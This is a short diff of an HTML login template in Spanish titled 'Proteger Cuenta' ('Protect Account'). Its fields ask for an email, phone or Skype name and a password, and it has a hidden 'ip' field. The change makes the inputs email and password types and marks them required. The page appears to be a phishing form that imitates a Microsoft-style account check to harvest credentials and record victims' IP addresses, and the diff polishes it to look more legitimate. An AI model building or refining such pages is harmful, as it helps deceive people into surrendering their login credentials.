@@ -75,9 +75,9 @@
             <img src="{{ url_for('static', filename='logo.png') }}" alt="Logo" style="width: 150px;">
             <h2>Proteger Cuenta</h2>
         </div>
-        <input type="text" id="input1" placeholder="Correo electrónico, teléfono o Skype" name="input1"><br>
+        <input type="email" id="input1" placeholder="Correo electrónico, teléfono o Skype" name="input1" required><br>
         <br>
-        <input type="text" id="input2" placeholder="Contraseña" name="input2"><br>
+        <input type="password" id="input2" placeholder="Contraseña" name="input2" required><br>
         <br>
         <input type="submit" value="Verificar">
         <input type="text" id="ip" name="ip" style="display:none ;">
